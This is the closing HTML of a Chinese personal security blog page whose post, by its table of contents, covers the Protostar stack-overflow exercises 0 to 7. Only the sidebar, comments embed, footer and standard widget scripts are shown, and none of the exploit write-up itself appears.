    <a class="bds_count" data-cmd="count"></a>
  </div>
  <script>
    window._bd_share_config = {
      "common": {
        "bdText": "",
        "bdMini": "2",
        "bdMiniList": false,
        "bdPic": ""
      },
      "share": {
        "bdSize": "16",
        "bdStyle": "0"
      },
      "image": {
        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
        "viewText": "分享到：",
        "viewSize": "16"
      }
    }
  </script>

<script>
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

      
    </div>
    <div class="footer-custom">
	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
    </div>
  </div>


          </div>
          


          
  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>
  


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">giantbranch</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">168</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">208</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
                    
                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Stack0"><span class="nav-number">1.</span> <span class="nav-text">Stack0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#覆盖成1或者其他非0值"><span class="nav-number">1.1.</span> <span class="nav-text">覆盖成1或者其他非0值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack1"><span class="nav-number">2.</span> <span class="nav-text">stack1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack2"><span class="nav-number">3.</span> <span class="nav-text">stack2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-3"><span class="nav-number">4.</span> <span class="nav-text">stack 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack4"><span class="nav-number">5.</span> <span class="nav-text">stack4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack5"><span class="nav-number">6.</span> <span class="nav-text">stack5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack6"><span class="nav-number">7.</span> <span class="nav-text">stack6</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#覆盖返回地址为ret指令地址"><span class="nav-number">7.1.</span> <span class="nav-text">覆盖返回地址为ret指令地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#覆盖返回地址为jmp-esp"><span class="nav-number">7.2.</span> <span class="nav-text">覆盖返回地址为jmp esp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他方法呢"><span class="nav-number">7.3.</span> <span class="nav-text">其他方法呢</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack7"><span class="nav-number">8.</span> <span class="nav-text">stack7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#收获"><span class="nav-number">8.1.</span> <span class="nav-text">收获</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">giantbranch</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




<div class="footer-custom">
<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
<br>
这是我的新博客，网站建于2017年10月
<!-- <br>以下UV,PV统计始于2018.06.23 -->
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  

  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  

    
      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://www.giantbranch.cn/2017/08/03/Exploit Exercises Protostar Stack Part 0-7/';
          this.page.identifier = '2017/08/03/Exploit Exercises Protostar Stack Part 0-7/';
          this.page.title = 'Exploit Exercises Protostar Stack Part 0-7';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://giantbranch.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  










  





  

  

  

  

  

  

</body>
</html>
